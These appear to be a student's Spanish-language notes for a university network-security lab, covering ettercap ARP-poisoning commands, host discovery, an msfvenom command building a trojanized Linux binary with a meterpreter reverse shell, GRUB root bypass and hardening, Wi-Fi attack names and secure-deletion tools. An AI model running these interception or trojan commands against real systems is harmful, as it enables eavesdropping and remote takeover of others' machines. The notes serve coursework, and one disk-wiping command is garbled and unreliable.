# PRÁCTICA 2 - EJEMPLOS DE CATEGORÍAS DE ATAQUE ET AL

- ettercap-text-only / ettercap-graphical

### ettercap 
- # ettercap -P repoison-arp -M arp:remote

-M arp es para interceptar el tráfico únicamente entre dos máquinas.
:remote indica que coja el tráfico entre dos máquinas 
pero también el tráfico que venga de Internet (del router)
:oneway solo intercepto el tráfico que va de la máquina hacia fuera, 
no el que le llega

-M port :remote/:tree
-M dhcp: 10.11.49.106-Y/255.255.254.0/10.8.12.49
-M icmp xx:_____:xx/X.X.X.X ___________ /_____// /_____//
-M ndp
-M arp:remote /10.11.49.106// /10.11.48.1//

### [IMPORTANTE] Entre qué máquinas me voy a meter:

Solo de una IP al router, o de una IP a otra IP

/10.11.49.106//    /10.11.48.1


### [IMPORTANTE] Para salir de ettercap;

Se sale con la letra q, nunca con Ctrl+C

##########

-w ficherito

##### probar WIRESHARK

1. ssh -X lsi@10.11.48.50 (carga las ventanas gráficas en la máquina personal)

2. probarlo en nuestra máquina personal

#####

ping -b 10.11.49.255
arp -a
# debian no acepta ping a direcciones de broadcast
## Solución: hacer un script con un for para hacer ping a todas las direcciones
## Solución2: nmap -sP 10.11.48/23

#####
atk6-alive6 (ping6 ff02::1)

#### apartado e)
analizar tráfico ens33
pcap

#### apartado f)
ettercap -P remote_browser

#### apartado g)

1. instalar metasploit

2. ponerlo a funcionar (crear bbdd... (seguir how-to))

3. crear un binario ejecutable troyanizado para que si alguien lo ejecute, lance un shell contra el metasploit. Payload meterpreter

##### msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=10.11.48.50 lport=1234 -f elf -o navigate3.0
chmod +x navigate3.0
ejecutable para linux con un reverse tcp de meterpreter


wget -r -k http:// comando para descargar un servidor web (info estática)

-l2 descarga dos niveles (index y siguiente nivel de página)

crappling

-H descargaría las páginas de ese server y a su vez las páginas que enlaza de otros servidores

hacerse root en una maquina a traves del grub desprotegido

rw init=/bin/sh

como proteger el grub?

grub-mkpasswd-pbkdf2 -> genera hash

/etc/grub.d/40_custom

set superuser=root

password_pbkdf2 root [pegar hash]

TEMPEST - ejercito se gasta millones en estas herramientas tempest

rebailling y reflow - el primero es resoldar un chip y el reflow es darle calor a la circuiteria

KRACK

krack attack contra wpa2

wpa3 aparece y se estandariza en 2018

ataques dragon blood contra wpa3

wpa3:

algoritmo SAE autenticacion simultanea entre iguales

algoritmo diffie-hellman CE (dragonfly se basa en él)


---------------- 

borrado seguro de información

srm - secure remove

shred 

wipe

eraser - borrado seguro para windows

dd if=/dev/unrandom if=/dev/sdb

sfill 

sswap

smem
